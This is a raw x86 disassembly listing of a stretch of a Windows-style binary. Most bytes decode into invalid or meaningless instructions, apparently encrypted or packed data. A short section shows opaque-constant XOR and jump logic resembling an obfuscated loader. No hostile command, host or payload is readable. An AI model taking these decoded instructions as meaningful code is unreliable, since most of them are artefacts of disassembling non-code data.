  405922:	adc    DWORD PTR [ecx-0x77],edx
  405925:	ins    DWORD PTR es:[edi],dx
  405926:	popa   
  405927:	dec    eax
  405928:	bound  edi,QWORD PTR [eax]
  40592a:	lock stos BYTE PTR es:[edi],al
  40592c:	and    al,BYTE PTR [eax-0x24]
  40592f:	imul   eax,DWORD PTR [ecx+0x15],0x157a770c
  405936:	(bad)  
  405937:	xchg   esp,eax
  405938:	jbe    0x40592f
  40593a:	dec    edi
  40593b:	fs int 0x12
  40593e:	out    dx,eax
  40593f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405940:	cmp    al,dl
  405942:	fisttp QWORD PTR [edi+eiz*4+0x101dc409]
  405949:	dec    eax
  40594a:	mov    edx,eax
  40594c:	xor    edx,DWORD PTR [edx]
  40594e:	hlt    
  40594f:	outs   dx,BYTE PTR ds:[esi]
  405950:	push   ss
  405951:	sahf   
  405952:	pop    esp
  405953:	jp     0x40598c
  405955:	scas   al,BYTE PTR es:[edi]
  405956:	mov    ch,0x2e
  405958:	dec    edi
  405959:	(bad)  
  40595a:	fstp   DWORD PTR ds:0x4f648089
  405960:	pop    ds
  405961:	push   esi
  405962:	inc    ebx
  405963:	mov    eax,ds:0x7c9a3436
  405968:	xor    DWORD PTR [edx+0x6c18be1d],ebx
  40596e:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405970:	fisub  DWORD PTR [esi+0x300957c9]
  405976:	inc    ecx
  405977:	das    
  405978:	jl     0x405920
  40597a:	add    ebp,DWORD PTR ss:[edx+0x32183344]
  405981:	shr    DWORD PTR [eax+0x58de41c5],cl
  405987:	gs mov bl,0x32
  40598a:	mov    ?,esp
  40598c:	bound  ecx,QWORD PTR [ebp+0x1d]
  40598f:	iret   
  405990:	aaa    
  405991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405992:	(bad)  [esi-0x68]
  405995:	inc    eax
  405996:	and    DWORD PTR [eax],esi
  405998:	in     al,dx
  405999:	les    esp,FWORD PTR [ecx-0x77001854]
  40599f:	push   es
  4059a0:	cdq    
  4059a1:	fwait
  4059a2:	sub    edx,edi
  4059a4:	push   eax
  4059a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a6:	(bad)  
  4059a7:	shl    BYTE PTR [eax+0x17124823],cl
  4059ad:	xchg   esi,eax
  4059ae:	test   eax,0xbb1cb874
  4059b3:	or     al,0xc7
  4059b5:	push   edi
  4059b6:	out    0x97,al
  4059b8:	jmp    0x743f7914
  4059bd:	mov    esi,0xe459b318
  4059c2:	adc    dh,bh
  4059c4:	cmp    edx,DWORD PTR [ebp+ecx*2+0x6d04a47b]
  4059cb:	pusha  
  4059cc:	rcl    BYTE PTR [eax-0x2fc7c6cb],1
  4059d2:	pop    edx
  4059d3:	lock xor BYTE PTR [ebp-0x250b04a7],bh
  4059da:	jp     0x4059e2
  4059dc:	mov    esp,0x76d137b2
  4059e1:	mov    ds:0x2d18b5b9,al
  4059e6:	popf   
  4059e7:	rcl    BYTE PTR cs:[eax-0x47],cl
  4059eb:	xor    DWORD PTR [ebx+0x47a1c666],ebp
  4059f1:	gs pop edx
  4059f3:	push   ss
  4059f4:	xchg   edx,eax
  4059f5:	add    DWORD PTR [edx+0x32],0xb0e6e9b8
  4059fc:	adc    al,0x2c
  4059fe:	xchg   esp,eax
  4059ff:	adc    eax,0x7a2c485d
  405a04:	dec    esp
  405a05:	xchg   edi,eax
  405a06:	cmp    ah,BYTE PTR [ebx]
  405a08:	sub    eax,0x54032464
  405a0d:	iret   
  405a0e:	retf   0x68fd
  405a11:	ja     0x405a78
  405a13:	not    BYTE PTR [edx-0x7c]
  405a16:	js     0x4059ff
  405a18:	mov    ch,0x1c
  405a1a:	mov    ebp,0xc1094121
  405a1f:	scas   eax,DWORD PTR es:[edi]
  405a20:	cmp    eax,0xd01410d2
  405a25:	sbb    BYTE PTR [eax-0x31bd8ec],bl
  405a2b:	jge    0x4059d9
  405a2d:	popf   
  405a2e:	jecxz  0x405aa1
  405a30:	push   eax
  405a31:	mov    WORD PTR [edx+ecx*4-0x45],fs
  405a35:	xchg   ebx,eax
  405a36:	stos   DWORD PTR es:[edi],eax
  405a37:	inc    edx
  405a38:	cdq    
  405a39:	cmc    
  405a3a:	(bad)  
  405a3b:	mov    bl,0xb6
  405a3d:	cld    
  405a3e:	mov    ah,0xea
  405a40:	(bad)  
  405a41:	ins    BYTE PTR es:[edi],dx
  405a42:	div    edi
  405a44:	and    DWORD PTR [esi-0x2a],ebx
  405a47:	ret    0xdce5
  405a4a:	cld    
  405a4b:	and    esi,DWORD PTR [eax+0x5809245b]
  405a51:	iret   
  405a52:	dec    edx
  405a53:	xor    DWORD PTR ds:0xc320c7a2,eax
  405a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a5a:	fadd   QWORD PTR [ecx+0x424ec335]
  405a60:	jno    0x405a2f
  405a62:	call   0x3e515641
  405a67:	and    BYTE PTR [esp+edx*4+0x22b79ce7],0x11
  405a6f:	or     al,0xf
  405a71:	inc    edx
  405a72:	(bad)  [ebp+ecx*1+0x582209fc]
  405a79:	cmc    
  405a7a:	adc    DWORD PTR [ecx-0x1055cf6a],eax
  405a80:	mov    eax,0xca4d19df
  405a85:	sub    ebx,ebp
  405a87:	in     eax,0xb9
  405a89:	mov    ebx,0xd7316075
  405a8e:	int    0x48
  405a90:	cwde   
  405a91:	fidivr DWORD PTR [eax-0x4c]
  405a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a95:	ret    0x3f6e
  405a98:	or     edi,0xb5d0547f
  405a9e:	in     al,0x97
  405aa0:	in     eax,0x7a
  405aa2:	ds push ecx
  405aa4:	add    al,0x54
  405aa6:	fisubr WORD PTR [ebp-0x6a]
  405aa9:	js     0x405a62
  405aab:	xor    BYTE PTR [edi],dh
  405aad:	fnsave [edx]
  405aaf:	sub    BYTE PTR [edx+0x6f616991],0x5d
  405ab6:	cmp    bh,0x2a
  405ab9:	call   0xc5223304
  405abe:	shr    BYTE PTR [eiz*8-0x6d177c76],cl
  405ac5:	jbe    0x405a88
  405ac7:	enter  0x20fb,0x13
  405acb:	and    ah,BYTE PTR [ecx]
  405acd:	dec    eax
  405ace:	push   edi
  405acf:	xor    al,0x95
  405ad2:	dec    edi
  405ad3:	fcmovbe st,st(1)
  405ad5:	ror    BYTE PTR [ebp-0x13],cl
  405ad8:	outs   dx,BYTE PTR ds:[esi]
  405ad9:	cmp    esi,DWORD PTR [ecx+edi*1]
  405adc:	pop    eax
  405add:	in     eax,dx
  405ade:	(bad)  
  405adf:	cmp    eax,0x91a14a0f
  405ae4:	jp     0x405b02
  405ae6:	imul   BYTE PTR [ecx-0x5d3640fc]
  405aec:	mov    edi,DWORD PTR [ebp-0x5813b679]
  405af2:	retf   
  405af3:	jmp    0x405a8d
  405af5:	pop    edi
  405af6:	test   al,0xdc
  405af8:	lods   eax,DWORD PTR ds:[esi]
  405af9:	mov    edx,0x3db117c9
  405afe:	cmp    BYTE PTR [esi+0x2e],dh
  405b01:	xor    eax,0xddd4a96f
  405b06:	(bad)  
  405b07:	int    0x82
  405b09:	imul   ebp,DWORD PTR ds:0x883ad84e,0xffffff8e
  405b10:	pop    esp
  405b11:	pop    ecx
  405b12:	out    0xbd,eax
  405b14:	mov    ds,WORD PTR [eax+0x2996d614]
  405b1a:	or     dh,BYTE PTR [ecx-0x43fd4cbf]
  405b20:	mov    BYTE PTR ds:0x43822770,al
  405b26:	ror    ebx,1
  405b28:	test   eax,0xdf013caf
  405b2d:	cli    
  405b2e:	sbb    edi,DWORD PTR [edi+0x7]
  405b31:	scas   eax,DWORD PTR es:[edi]
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43369b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433653,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4336a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4336ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43372f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x5c25cbfe
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c29
  405be0:	push   edx
  405be1:	dec    eax
  405be2:	lds    edx,FWORD PTR [edx-0x30]
  405be5:	or     ebp,DWORD PTR ds:0x53d79b51
  405beb:	add    esp,esp
  405bed:	dec    ebx
  405bee:	int3   
  405bef:	ins    DWORD PTR es:[edi],dx
  405bf0:	adc    al,0xb4
  405bf2:	vpsubsb xmm2,xmm5,xmm1
  405bf6:	inc    esp
  405bf7:	cwde   
  405bf8:	jno    0x405bab
  405bfa:	mov    ebp,0x20cf41c6
  405bff:	ror    BYTE PTR [esi],0x42
  405c02:	arpl   WORD PTR [edx],ax
  405c04:	mov    al,ds:0x22ff6442
  405c09:	fistp  QWORD PTR [esi-0x6ff58696]
  405c0f:	not    BYTE PTR [edi-0x80]
  405c12:	(bad)  
  405c13:	shl    DWORD PTR [edi-0x34e5477e],1
  405c19:	pop    edi
  405c1a:	shr    DWORD PTR [ecx],0xe8
  405c1d:	sub    DWORD PTR [eax+ebx*8+0x68737787],0xf782f813
  405c28:	lahf   
  405c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c2a:	aam    0xbb
  405c2c:	add    BYTE PTR [ebp-0x10aa47ff],0x61
  405c33:	cmc    
  405c34:	test   al,0x26
  405c36:	xchg   edi,eax
  405c37:	add    DWORD PTR [ebx-0x2e],edx
  405c3a:	jmp    0x28babfea
  405c3f:	dec    eax
  405c40:	daa    
  405c41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c43:	sub    esp,DWORD PTR [esi]
  405c45:	jp     0x405ca9
  405c47:	xor    BYTE PTR [edx],bl
  405c49:	mov    dh,0x24
  405c4b:	test   eax,0x6388f212
  405c50:	dec    ebx
  405c51:	inc    ebp
  405c52:	push   ebx
  405c53:	js     0x405cb3
  405c55:	or     BYTE PTR ds:0x789b2acc,0xd8
  405c5c:	not    BYTE PTR [eax+0x35a8eb17]
  405c62:	cmp    eax,0xf413b15c
  405c67:	push   ecx
  405c68:	call   0xf906ad2a
  405c6d:	push   ss
  405c6e:	repnz xchg ebp,eax
  405c70:	dec    edx
  405c71:	cmp    esp,DWORD PTR [ebx-0x5]
  405c74:	xchg   esp,eax
  405c75:	lea    edi,[esi-0x47]
  405c78:	scas   al,BYTE PTR es:[edi]
  405c79:	test   DWORD PTR [ecx-0x47],esp
  405c7c:	and    esi,DWORD PTR [ecx-0x57a1ac0e]
  405c82:	mov    ebp,0x2333378b
  405c87:	add    BYTE PTR [edx-0x16],ch
  405c8a:	push   edi
  405c8b:	mov    cl,0xd
  405c8d:	(bad)  [ebx+0x17]
  405c90:	cmp    eax,0xb3d861e6
  405c95:	sub    ch,BYTE PTR [edx+0x14bdd2b9]
  405c9b:	xor    DWORD PTR [ecx],edx
  405c9d:	adc    al,0x6b
  405c9f:	test   eax,0xecf66ac4
  405ca4:	mov    WORD PTR [eax+0x4f],?
  405ca7:	rcl    BYTE PTR ss:[ecx+0x78],0x28
  405cac:	pop    es
  405cad:	cld    
  405cae:	dec    edi
  405caf:	ss and al,0xef
  405cb2:	mov    bh,0x17
  405cb4:	shl    DWORD PTR [ebp+0x47],0x5a
  405cb8:	out    dx,eax
  405cb9:	xor    DWORD PTR [ecx],ebx
  405cbb:	mov    eax,0x5d378b7f
  405cc0:	jne    0x405c45
  405cc2:	push   esi
  405cc3:	push   esp
  405cc4:	dec    edx
  405cc5:	inc    ebx
  405cc6:	xor    al,0x96
  405cc8:	add    eax,0x1a46ddf4
  405ccd:	dec    edi
  405cce:	dec    edx
  405ccf:	mov    dh,0x64
  405cd1:	add    al,0xf0
  405cd3:	dec    ebp
  405cd4:	pop    ds
  405cd5:	rcl    DWORD PTR [eax],1
  405cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cd8:	mov    al,ds:0xb30ac3b1
  405cdd:	nop
  405cde:	mov    BYTE PTR ds:0x14d5fc0,ch
  405ce4:	int    0xb3
  405ce6:	imul   eax,DWORD PTR [edx],0x1f86d385
  405cec:	adc    BYTE PTR [edx],0x3e
  405cef:	or     dh,BYTE PTR [ebp+0x1d88c6e7]
  405cf5:	adc    ecx,DWORD PTR [esi-0x47]
  405cf8:	std    
  405cf9:	fwait
  405cfa:	push   eax
  405cfb:	or     DWORD PTR [ecx+0x5f9fc319],esp
  405d01:	and    al,0xaf
  405d03:	jb     0x405d2e
  405d05:	push   edi
  405d06:	lods   al,BYTE PTR ds:[esi]
  405d07:	dec    edi
  405d08:	fdivr  QWORD PTR [ebx*4+0x452bb223]
  405d0f:	outs   dx,BYTE PTR ds:[esi]
  405d10:	cmp    ah,BYTE PTR [ecx+0x4f8bb68]
  405d16:	sub    dh,BYTE PTR [esi+0x29]
  405d19:	push   ds
  405d1a:	pop    es
  405d1b:	mov    ebp,DWORD PTR [eax+0x6110479e]
  405d21:	arpl   WORD PTR [edi],ax
  405d23:	ja     0x405cfe
  405d25:	jp     0x405d23
  405d27:	call   0x554d4a87
  405d2c:	xor    BYTE PTR [edx-0x509e6042],0x5f
  405d33:	clc    
  405d34:	pop    ss
  405d35:	and    DWORD PTR [edx-0x7c],0xd1e9ef44
  405d3c:	(bad)  
  405d3d:	cmp    dh,BYTE PTR [ecx+0x7d]
  405d40:	and    ch,BYTE PTR [ecx]
  405d42:	cmp    eax,0x57eb4f9d
  405d47:	xchg   DWORD PTR [esi+0x2fcd9727],esi
  405d4d:	je     0x405d3d
  405d4f:	inc    ebp
  405d50:	push   0x2
  405d52:	push   ds
  405d53:	pusha  
  405d54:	mov    ds:0xf5b30791,eax
  405d59:	and    al,0xa7
  405d5b:	scas   eax,DWORD PTR es:[edi]
  405d5c:	dec    edi
  405d5d:	lahf   
  405d5e:	mov    ah,0x39
  405d60:	and    eax,0x5fb891b0
  405d65:	gs inc edx
  405d67:	outs   dx,DWORD PTR ds:[esi]
  405d68:	(bad)
  405d6b:	or     ah,BYTE PTR [ebx]
  405d6d:	ror    BYTE PTR [edx-0x5d],0x9a
  405d71:	inc    edi
  405d72:	dec    edx
  405d73:	jmp    0x405db9
  405d75:	ja     0x405dec
  405d77:	push   eax
  405d78:	std    
  405d79:	adc    dh,BYTE PTR [ecx+eiz*8]
  405d7c:	out    dx,eax
  405d7d:	sbb    esp,DWORD PTR [eax+0xe]
  405d80:	sbb    edi,ecx
  405d82:	popf   
  405d83:	adc    BYTE PTR [ecx+0x60c8ec1a],dh
  405d89:	fstp   QWORD PTR ds:0x5c01c176
  405d8f:	mov    ch,0x18
  405d91:	arpl   WORD PTR [edx-0x6b180196],bx
  405d97:	xchg   ecx,eax
  405d98:	push   ebp
  405d99:	cld    
  405d9a:	mov    cl,0x44
  405d9c:	out    0x2c,al
  405d9e:	sbb    al,0x17
  405da0:	or     eax,0x3cd1496f
  405da5:	shr    DWORD PTR [ebx],0x3c
  405da8:	pop    esi
  405da9:	inc    esp
  405daa:	popa   
  405dab:	mov    dl,ah
  405dad:	pop    edx
  405dae:	fst    DWORD PTR [edx]
  405db0:	xchg   edi,eax
  405db1:	lods   al,BYTE PTR ds:[esi]
  405db2:	stos   DWORD PTR es:[edi],eax
  405db3:	lods   eax,DWORD PTR ds:[esi]
  405db4:	fcom   QWORD PTR [ebx+0x30]
  405db7:	push   ebp
  405db8:	sbb    esi,DWORD PTR [edx]
  405dba:	push   edx
  405dbb:	inc    ebp
  405dbc:	daa    
  405dbd:	xor    eax,ecx
  405dbf:	fsubr  DWORD PTR [edx-0x59]
  405dc2:	stos   DWORD PTR es:[edi],eax
  405dc3:	stos   BYTE PTR es:[edi],al
  405dc4:	inc    ecx
  405dc5:	push   ecx
  405dc6:	dec    edi
  405dc7:	sbb    cl,bl
  405dc9:	pop    ecx
  405dca:	and    eax,0x1a9aceb4
  405dcf:	mov    dh,0x61
  405dd1:	popa   
  405dd2:	mov    al,ds:0x69e754be
  405dd7:	and    dl,BYTE PTR [eax+0x5b]
  405dda:	js     0x405de8
  405ddc:	sub    BYTE PTR ds:0x8d30325f,ah
  405de2:	add    DWORD PTR [edx],ecx
  405de4:	sahf   
  405de5:	mov    esi,0xfbf19bcd
  405dea:	sub    eax,0x8435e2a7
  405def:	xor    DWORD PTR [edi-0x69],0x4f725660
  405df6:	mov    al,0xd4
  405df8:	xchg   esp,eax
  405df9:	dec    esi
  405dfa:	ja     0x405d95
  405dfc:	sbb    ah,BYTE PTR cs:0x67099e68
  405e03:	loop   0x405e03
  405e05:	xchg   edi,eax
  405e06:	xlat   BYTE PTR ds:[ebx]
  405e07:	cld    
  405e08:	sbb    eax,0xced854a0
  405e0d:	cdq    
  405e0e:	mov    ebp,0x6151584d
  405e13:	fnstcw WORD PTR [eax]
  405e15:	and    edx,esp
  405e17:	cmp    eax,0x85c66398
  405e1c:	inc    edx
  405e1d:	(bad)  
  405e1e:	jmp    0x5b230d
  405e23:	cli    
  405e24:	mov    ds:0x2d828a94,eax
  405e29:	test   al,0xc2
  405e2b:	adc    dh,ah
  405e2d:	pop    es
  405e2e:	int3   
  405e2f:	add    cl,BYTE PTR [ecx+ebx*2+0x47]
  405e33:	or     cl,dh
  405e35:	jno    0x405dde
  405e37:	es jecxz 0x405e5b
  405e3a:	add    BYTE PTR [ecx],dl
  405e3c:	push   ds
  405e3d:	pop    esp
  405e3e:	retf   0x474b
  405e41:	cmp    al,bl
  405e43:	pop    edx
  405e44:	scas   al,BYTE PTR es:[edi]
  405e45:	ret    0x4112
  405e48:	(bad)  
  405e49:	fistp  QWORD PTR [ecx]
  405e4b:	pop    esi
  405e4c:	sbb    DWORD PTR [ebx+0x394faec5],esi
  405e52:	aas    
  405e53:	icebp  
  405e54:	rcr    BYTE PTR [ebp-0x4cb9a89c],0xf9
  405e5b:	repnz dec eax
  405e5d:	pop    ss
  405e5e:	out    dx,eax
  405e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e60:	mov    ebp,ebx
  405e62:	daa    
  405e63:	fld    QWORD PTR [ecx+0xa6429fa]
  405e69:	xor    ch,BYTE PTR [edx]
  405e6b:	jno    0x405e33
  405e6d:	add    DWORD PTR [edx],esi
  405e6f:	dec    ebp
  405e70:	xor    al,0x19
  405e72:	push   edi
  405e73:	add    al,0x9
  405e75:	daa    
  405e76:	and    ecx,DWORD PTR [ecx-0x233b1cd2]
  405e7c:	mov    esi,es
  405e7e:	add    eax,0xf4d8faf6
  405e83:	fidivr WORD PTR [ebx-0xa6ae75c]
  405e89:	sbb    DWORD PTR [esi+0x69a068d3],0x6
  405e90:	push   esp
  405e91:	add    DWORD PTR ds:[edx-0x346afd15],edi
  405e98:	or     eax,0x7fe7731a
  405e9d:	(bad)  
  405e9e:	ror    BYTE PTR [edi],0x49
  405ea1:	push   ss
  405ea2:	pop    eax
  405ea3:	mov    bl,0xef
  405ea5:	iret   
  405ea6:	mov    WORD PTR [ebx-0xffc0b3c],?
  405eac:	push   0xe8f59b01
  405eb1:	test   al,0xfe
  405eb3:	sub    esi,DWORD PTR [eax+0x21]
  405eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eb7:	jmp    0xa056:0x842022b9
  405ebe:	jmp    0x59e0f2c5
  405ec3:	fdivr  QWORD PTR [eax]
  405ec5:	es aam 0xbc
  405ec8:	xor    edx,DWORD PTR [eax-0x24c87bec]
  405ece:	xor    eax,0x745abe03
  405ed3:	aad    0x99
  405ed5:	xlat   BYTE PTR ds:[ebx]
  405ed6:	push   ebx
  405ed7:	xchg   esi,eax
  405ed8:	dec    esp
  405ed9:	fmul   DWORD PTR [ebp+edi*1-0x79d3a8e4]
  405ee0:	iret   
  405ee1:	(bad)  
  405ee2:	loopne 0x405e67
  405ee4:	mov    BYTE PTR [edi+0x6830df20],dh
  405eea:	loope  0x405f18
  405eec:	(bad)  
  405eed:	and    BYTE PTR [ebx+0x5d18dcb4],ah
  405ef3:	jge    0x405eb1
  405ef5:	bound  edi,QWORD PTR [ecx]
  405ef7:	cmc    
  405ef8:	out    0x83,al
  405efa:	push   esp
  405efb:	addr16 and esi,ebp
  405efe:	inc    esi
  405eff:	scas   al,BYTE PTR es:[edi]
  405f00:	ret    
  405f01:	cmp    al,0x3c
  405f03:	push   eax
  405f04:	shr    al,0xf
  405f07:	adc    ah,BYTE PTR [ecx]
  405f09:	aad    0x11
  405f0b:	xchg   BYTE PTR [esi],dh
  405f0d:	sub    eax,0x331c23db
  405f12:	icebp  
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [edx-0x6],es
  405f28:	shr    BYTE PTR [ecx+0x7e7e30a6],0x2c
  405f2f:	jge    0x405faf
  405f31:	jle    0x405f68
  405f33:	xchg   ecx,eax
  405f34:	pop    es
  405f35:	call   0xf474:0x4b561cfb
  405f3c:	dec    ebp
  405f3d:	dec    edx
  405f3e:	xchg   ebx,eax
  405f3f:	adc    DWORD PTR [ecx],ecx
  405f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f42:	cdq    
  405f43:	mov    ss,ebx
  405f45:	xor    BYTE PTR [eiz*8-0x4935163e],0x2e
  405f4d:	sub    cl,BYTE PTR [edx-0x30]
  405f50:	push   esi
  405f51:	fdiv   QWORD PTR [edx-0x63]
  405f54:	cld    
  405f55:	pusha  
  405f56:	daa    
  405f57:	clc    
  405f58:	mov    WORD PTR [ebx],?
  405f5a:	and    BYTE PTR [esi+0x30ea36a1],al
  405f60:	bswap  edi
  405f62:	ficomp DWORD PTR [esi+0x51]
  405f65:	push   edi
  405f66:	(bad)  
  405f67:	dec    esp
  405f68:	stos   DWORD PTR es:[edi],eax
  405f69:	add    ah,BYTE PTR [ecx+ecx*4-0x5c22313c]
  405f70:	cdq    
  405f71:	iret   
  405f72:	push   ecx
  405f73:	mov    es,WORD PTR [edx]
  405f75:	adc    al,0x9a
  405f77:	sub    DWORD PTR [ebx-0x1abbed88],0xa4b9786e
  405f81:	aas    
  405f82:	and    al,0xc0
  405f84:	call   0x1661:0x281060e8
  405f8b:	mov    eax,ds:0xa3c761d9
  405f90:	push   cs
  405f91:	mov    esi,0xe692ed67
  405f96:	pop    ebx
  405f97:	dec    esp
  405f98:	jnp    0x405f45
  405f9a:	int    0x14
  405f9c:	jg     0x406017
  405f9e:	sbb    eax,esi
  405fa0:	div    BYTE PTR [esi-0x2c6e8647]
  405fa6:	adc    eax,0xaaa3bd57
  405fab:	push   es
  405fac:	dec    esi
  405fad:	mov    cl,0xab
  405faf:	stos   DWORD PTR es:[edi],eax
  405fb0:	jnp    0x40601d
  405fb2:	xchg   BYTE PTR ds:[esp+esi*1+0x42879ef1],bl
  405fba:	loope  0x405fe3
  405fbc:	sub    al,0x48
  405fbe:	fsubr  QWORD PTR [edx]
  405fc0:	mov    bl,0xca
  405fc2:	and    edi,edi
  405fc4:	scas   al,BYTE PTR es:[edi]
  405fc5:	cmp    DWORD PTR [ecx],edx
  405fc7:	jp     0x406008
  405fc9:	fild   WORD PTR [edi-0x2a]
  405fcc:	mov    ds:0x66d07f60,al
  405fd1:	xor    al,0x94
  405fd3:	stc    
  405fd4:	mov    ebx,0xc9587e3e
  405fd9:	fimul  WORD PTR [ebx-0x56]
  405fdc:	push   cs
  405fdd:	jmp    0x406045
  405fdf:	push   ecx
  405fe0:	mov    edx,0xe0d39b6b
  405fe5:	and    al,0xbc
  405fe7:	xchg   esp,eax
  405fe8:	js     0x406063
  405fea:	mov    esi,0x37340e1b
  405fef:	xor    bl,BYTE PTR [eax]
  405ff1:	cli    
  405ff2:	aam    0x9b
  405ff4:	int    0x2b
  405ff6:	lock pop ebx
  405ff8:	push   ebp
  405ff9:	jo     0x405f8f
  405ffb:	neg    BYTE PTR [ecx]
  405ffd:	adc    BYTE PTR [ecx+0x2f],cl
  406000:	leave  
  406001:	and    eax,DWORD PTR [ebx]
  406003:	xlat   BYTE PTR ds:[ebx]
  406004:	scas   eax,DWORD PTR es:[edi]
  406005:	lods   al,BYTE PTR ds:[esi]
  406006:	outs   dx,BYTE PTR ds:[esi]
  406007:	mov    gs:0xcc266af5,al
  40600d:	inc    ecx
  40600e:	imul   edx,DWORD PTR [eax+0x3e],0x1b
  406012:	enter  0xabb0,0xb7
  406016:	push   edx
  406017:	je     0x40605d
  406019:	stc    
  40601a:	je     0x405fc4
  40601c:	xor    al,0xd7
  40601e:	fiadd  DWORD PTR [ebx-0x12]
  406021:	cmp    eax,0xef2bd02a
  406026:	or     dh,bh
  406028:	push   esi
  406029:	scas   eax,DWORD PTR es:[edi]
  40602a:	sahf   
  40602b:	in     al,0x53
  40602d:	clc    
  40602e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40602f:	jne    0x40603d
  406031:	or     cl,BYTE PTR [edi-0x1b5732d1]
  406037:	inc    ebx
  406038:	gs mov edx,0xf657fe60
  40603e:	out    0x4c,al
  406040:	pop    ebx
  406041:	mov    cl,0x47
  406043:	leave  
  406044:	(bad)  
  406045:	iret   
  406046:	addr16 xchg edi,eax
  406048:	xor    eax,0x63e5d795
  40604d:	inc    esp
  40604e:	or     DWORD PTR [ebx+eiz*4],esi
  406051:	pop    ebp
  406052:	mov    WORD PTR [edx-0x5cf9a8d4],ss
  406058:	xor    al,0x2e
  40605a:	jns    0x406017
  40605c:	inc    esi
  40605d:	cmp    BYTE PTR [ebx+0x4f],ch
  406060:	scas   eax,DWORD PTR es:[edi]
  406061:	popa   
  406062:	mov    esp,0x4a3f2dff
  406067:	nop
  406068:	in     al,0x69
  40606a:	jmp    0x4fc948d5
  40606f:	cdq    
  406070:	pushf  
  406071:	sub    BYTE PTR [ebp+0x7f],dl
  406074:	push   esi
  406075:	daa    
  406076:	into   
  406077:	and    BYTE PTR [eax-0x21],ah
  40607a:	jmp    0x4060e1
  40607c:	fnstenv [ecx]
  40607e:	test   eax,0x2b7e6a03
  406083:	pop    eax
  406084:	inc    eax
  406085:	mov    eax,0x5a193a98
  40608a:	div    BYTE PTR [ebx-0x5b6eaa66]
  406090:	xor    DWORD PTR [edi+0x20da673c],esp
  406096:	xchg   edi,eax
  406097:	or     ebp,DWORD PTR [ebp+0x6232bb45]
  40609d:	int    0xeb
  40609f:	sub    bh,ch
  4060a1:	add    bh,BYTE PTR [edi+0x5f]
  4060a4:	jo     0x4060fa
  4060a6:	cmc    
  4060a7:	cmc    
  4060a8:	pop    es
  4060a9:	dec    edi
  4060aa:	sub    edi,DWORD PTR [ebx+0x57]
  4060ad:	inc    edx
  4060ae:	jp     0x406119
  4060b0:	cli    
  4060b1:	push   edi
  4060b2:	int3   
  4060b3:	jbe    0x4060bc
  4060b5:	mov    dl,0xe3
  4060b7:	je     0x406138
  4060b9:	leave  
  4060ba:	push   esp
  4060bb:	es (bad) 
  4060bd:	dec    eax
  4060be:	rcr    BYTE PTR [ebx+0x78],cl
  4060c1:	inc    ebp
  4060c2:	push   eax
  4060c3:	rol    BYTE PTR [edx+eax*8],0xb6
  4060c7:	das    
  4060c8:	inc    esi
  4060c9:	iret   
  4060ca:	xor    al,0x92
  4060cc:	dec    edx
  4060cd:	or     al,BYTE PTR [edx+edx*8+0x14d2c85a]
  4060d4:	jmp    0xc363:0x4ee68e95
  4060db:	push   esp
  4060dc:	iret   
  4060dd:	in     al,0x97
  4060df:	inc    edx
  4060e0:	mov    WORD PTR [edi],ss
  4060e2:	jnp    0x406120
  4060e4:	dec    edx
  4060e5:	fdivr  DWORD PTR ss:[edi]
  4060e8:	jmp    0x4060e6
  4060ea:	add    DWORD PTR [ebp+edx*2-0x1f],0x88bc7dac
  4060f2:	inc    ecx
  4060f3:	add    esp,DWORD PTR [edi]
  4060f5:	mov    cl,0x32
  4060f7:	nop
  4060f8:	add    DWORD PTR [edi-0x5a],ecx
  4060fb:	arpl   WORD PTR [ebx+esi*8],sp
  4060fe:	test   dl,0x72
  406101:	lods   eax,DWORD PTR ds:[esi]
  406102:	pop    esp
  406103:	popf   
  406104:	fnstenv [ebx+0x5]
  406107:	mov    eax,ds:0xfdeff9e8
  40610c:	lds    eax,FWORD PTR [edi+0x52]
  40610f:	(bad)  
  406110:	cdq    
  406111:	xor    esp,0xffffffa0
  406114:	cwde   
